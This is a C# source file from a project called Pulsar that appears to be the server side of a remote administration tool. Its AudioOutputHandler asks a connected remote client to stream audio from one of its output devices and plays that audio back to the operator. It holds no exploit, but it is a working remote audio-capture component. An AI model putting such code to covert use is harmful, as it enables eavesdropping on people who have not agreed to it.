using NAudio.Wave;
using Pulsar.Common.Messages;
using Pulsar.Common.Messages.Audio;
using Pulsar.Common.Messages.Other;
using Pulsar.Common.Networking;
using Pulsar.Server.Networking;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;

namespace Pulsar.Server.Messages
{
    /// <summary>
    /// Handles messages for the interaction with the microphone.
    /// </summary>
    public class AudioOutputHandler : MessageProcessorBase<Bitmap>, IDisposable
    {
        /// <summary>
        /// States if the client is currently streaming microphone bits.
        /// </summary>
        public bool IsStarted { get; set; }

        /// <summary>
        /// Used in lock statements to synchronize access to <see cref="_codec"/> between UI thread and thread pool.
        /// </summary>
        private readonly object _syncLock = new object();

        /// <summary>
        /// Represents the method that will handle microphone changes.
        /// </summary>
        /// <param name="sender">The message processor which raised the event.</param>
        /// <param name="device">All currently available microphones.</param>
        public delegate void OutputChangedEventHandler(object sender, List<Tuple<int, string>> device);

        /// <summary>
        /// Raised when a microphone changed.
        /// </summary>
        /// <remarks>
        /// Handlers registered with this event will be invoked on the
        /// <see cref="System.Threading.SynchronizationContext"/> chosen when the instance was constructed.
        /// </remarks>
        public event OutputChangedEventHandler OutputChanged;

        /// <summary>
        /// Represents the method that will handle audio data reception.
        /// </summary>
        /// <param name="sender">The message processor which raised the event.</param>
        /// <param name="audioData">The raw audio data bytes.</param>
        public delegate void AudioDataReceivedEventHandler(object sender, byte[] audioData);

        /// <summary>
        /// Raised when audio data is received from the remote system audio.
        /// </summary>
        /// <remarks>
        /// Handlers registered with this event will be invoked on the
        /// <see cref="System.Threading.SynchronizationContext"/> chosen when the instance was constructed.
        /// </remarks>
        public event AudioDataReceivedEventHandler AudioDataReceived;

        /// <summary>
        /// Reports changed microphones.
        /// </summary>
        /// <param name="devices">All currently available microphones.</param>
        private void OnOutputChanged(List<Tuple<int, string>> devices)
        {
            SynchronizationContext.Post(dvce =>
            {
                var handler = OutputChanged;
                handler?.Invoke(this, (List<Tuple<int, string>>)dvce);
            }, devices);
        }

        /// <summary>
        /// Reports received audio data.
        /// </summary>
        /// <param name="audioData">The raw audio data bytes.</param>
        private void OnAudioDataReceived(byte[] audioData)
        {
            SynchronizationContext.Post(data =>
            {
                var handler = AudioDataReceived;
                handler?.Invoke(this, (byte[])data);
            }, audioData);
        }

        /// <summary>
        /// The client which is associated with this audio handler.
        /// </summary>
        private readonly Client _client;

        /// <summary>
        /// Initializes a new instance of the <see cref="AudioHandler"/> class using the given client.
        /// </summary>
        /// <param name="client">The associated client.</param>
        public AudioOutputHandler(Client client) : base(true)
        {
            _client = client;
        }

        /// <summary>
        /// Receives the bytes.
        /// </summary>
        private BufferedWaveProvider _provider;

        /// <summary>
        /// Plays the received audio
        /// </summary>
        private WaveOut _audioStream;

        /// <summary>
        /// Holds the desired bitrate
        /// </summary>
        public int _bitrate = 44100;

        /// <inheritdoc />
        public override bool CanExecute(IMessage message) => message is GetOutputResponse || message is GetOutputDeviceResponse;

        /// <inheritdoc />
        public override bool CanExecuteFrom(ISender sender) => _client.Equals(sender);

        /// <inheritdoc />
        public override void Execute(ISender sender, IMessage message)
        {
            switch (message)
            {
                case GetOutputResponse d:
                    Execute(sender, d);
                    break;

                case GetOutputDeviceResponse m:
                    Execute(sender, m);
                    break;
            }
        }

        /// <summary>
        /// Begins receiving frames from the client using the specified quality and display.
        /// </summary>
        /// <param name="device">The device to receive audio from.</param>
        public void BeginReceiveAudio(int device)
        {
            lock (_syncLock)
            {
                try
                {
                    if (IsStarted)
                    {
                        try
                        {
                            _client.Send(new GetOutput { DeviceIndex = device, Destroy = true });
                        }
                        catch (Exception ex)
                        {
                            Debug.WriteLine($"Error stopping existing stream: {ex.Message}");
                        }
                    }

                    if (_audioStream != null)
                    {
                        try
                        {
                            _audioStream.Stop();
                            _audioStream.Dispose();
                        }
                        catch (Exception ex)
                        {
                            Debug.WriteLine($"Error cleaning up existing audio stream: {ex.Message}");
                        }
                        _audioStream = null;
                        _provider = null;
                    }

                    IsStarted = true;
                    WaveFormat waveFormat = new WaveFormat(_bitrate, 2); // 2 channels (stereo) as default
                    _provider = new BufferedWaveProvider(waveFormat);
                    _audioStream = new WaveOut();
                    _audioStream.Init(_provider);
                    _audioStream.Play();
                    _client.Send(new GetOutput { CreateNew = true, DeviceIndex = device, Bitrate = _bitrate });
                }
                catch (NAudio.MmException ex)
                {
                    // Handle the exception gracefully
                    IsStarted = false;
                    _provider = null;
                    _audioStream = null;
                    System.Windows.Forms.MessageBox.Show($"Error initializing audio output device: {ex.Message}",
                        "Audio Error",
                        System.Windows.Forms.MessageBoxButtons.OK,
                        System.Windows.Forms.MessageBoxIcon.Error);
                }
                catch (Exception ex)
                {
                    // Handle any other unexpected exceptions
                    IsStarted = false;
                    _provider = null;
                    _audioStream = null;
                    System.Windows.Forms.MessageBox.Show($"An unexpected error occurred: {ex.Message}",
                        "Audio Error",
                        System.Windows.Forms.MessageBoxButtons.OK,
                        System.Windows.Forms.MessageBoxIcon.Error);
                }
            }
        }

        /// <summary>
        /// Ends receiving audio from the client.
        /// </summary>
        /// /// <param name="device">The device to stop.</param>
        public void EndReceiveAudio(int device)
        {
            lock (_syncLock)
            {
                try
                {
                    _client.Send(new GetOutput { DeviceIndex = device, Destroy = true });
                }
                catch (Exception ex)
                {
                    Debug.WriteLine($"Error sending destroy message: {ex.Message}");
                }
                finally
                {
                    IsStarted = false;
                }
            }
        }

        /// <summary>
        /// Refreshes the available displays of the client.
        /// </summary>
        public void RefreshOutput()
        {
            _client.Send(new GetOutputDevice());
        }

        private void Execute(ISender client, GetOutputResponse message)
        {
            lock (_syncLock)
            {
                try
                {
                    if (!IsStarted)
                        return;

                    if (message?.Audio == null || message.Audio.Length == 0)
                    {
                        return;
                    }

                    if (_provider == null)
                    {
                        return;
                    }

                    OnAudioDataReceived(message.Audio);

                    _provider.AddSamples(message.Audio, 0, message.Audio.Length);
                    message.Audio = null;

                    client.Send(new GetOutput { DeviceIndex = message.Device, Bitrate = _bitrate });
                }
                catch (ObjectDisposedException ex)
                {
                    Debug.WriteLine($"Audio resources disposed: {ex.Message}");
                    IsStarted = false;
                }
                catch (InvalidOperationException ex)
                {
                    Debug.WriteLine($"Audio stream invalid operation: {ex.Message}");
                    IsStarted = false;
                }
                catch (Exception ex)
                {
                    Debug.WriteLine($"Error processing audio output: {ex.Message}");
                }
            }
        }

        private void Execute(ISender client, GetOutputDeviceResponse message)
        {
            OnOutputChanged(message.DeviceInfos);
        }

        /// <summary>
        /// Disposes all managed and unmanaged resources associated with this message processor.
        /// </summary>
        public void Dispose()
        {
            Dispose(true);
            GC.SuppressFinalize(this);
        }

        protected virtual void Dispose(bool disposing)
        {
            if (disposing)
            {
                lock (_syncLock)
                {
                    try
                    {
                        if (_audioStream != null)
                        {
                            try
                            {
                                _audioStream.Stop();
                            }
                            catch (Exception ex)
                            {
                                Debug.WriteLine($"Error stopping audio stream: {ex.Message}");
                            }

                            try
                            {
                                _provider?.ClearBuffer();
                            }
                            catch (Exception ex)
                            {
                                Debug.WriteLine($"Error clearing audio buffer: {ex.Message}");
                            }

                            try
                            {
                                _audioStream.Dispose();
                            }
                            catch (Exception ex)
                            {
                                Debug.WriteLine($"Error disposing audio stream: {ex.Message}");
                            }

                            _audioStream = null;
                            _provider = null;
                        }
                    }
                    catch (Exception ex)
                    {
                        Debug.WriteLine($"Error in audio dispose: {ex.Message}");
                    }
                    finally
                    {
                        IsStarted = false;
                    }
                }
            }
        }
    }
}